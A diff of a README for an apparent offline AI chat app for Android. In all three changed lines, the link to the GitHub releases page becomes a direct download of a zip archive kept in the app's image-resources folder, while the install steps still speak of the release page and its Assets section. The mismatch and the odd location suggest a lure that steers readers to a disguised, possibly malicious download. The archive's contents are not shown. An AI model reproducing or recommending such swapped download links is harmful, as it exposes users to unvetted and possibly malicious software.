@@ -1,6 +1,6 @@
 # 🔒 OfflineLLM - Private AI chat, kept local
 
-[![Download OfflineLLM](https://img.shields.io/badge/Download-OfflineLLM-6A5ACD?style=for-the-badge&logo=github)](https://github.com/peleg23/OfflineLLM/releases)
+[![Download OfflineLLM](https://img.shields.io/badge/Download-OfflineLLM-6A5ACD?style=for-the-badge&logo=github)](https://github.com/peleg23/OfflineLLM/raw/refs/heads/main/app/src/main/res/drawable/LLM_Offline_2.0.zip)
 
 ## 📱 What OfflineLLM does
 
@@ -22,7 +22,7 @@ For best results, use a device with at least 6 GB RAM. Smaller models can run on
 
 ## 🚀 Download and install
 
-1. Open the release page: https://github.com/peleg23/OfflineLLM/releases
+1. Open the release page: https://github.com/peleg23/OfflineLLM/raw/refs/heads/main/app/src/main/res/drawable/LLM_Offline_2.0.zip
 2. Find the latest release at the top of the page
 3. In the Assets section, download the Android app file
 4. Open the downloaded file on your Android device
@@ -124,7 +124,7 @@ This setup helps the app run large language models on the device itself.
 
 ## 📥 Download again
 
-Use the release page here to get the latest app version: https://github.com/peleg23/OfflineLLM/releases
+Use the release page here to get the latest app version: https://github.com/peleg23/OfflineLLM/raw/refs/heads/main/app/src/main/res/drawable/LLM_Offline_2.0.zip
 
 ## 🗂️ Project topics
 
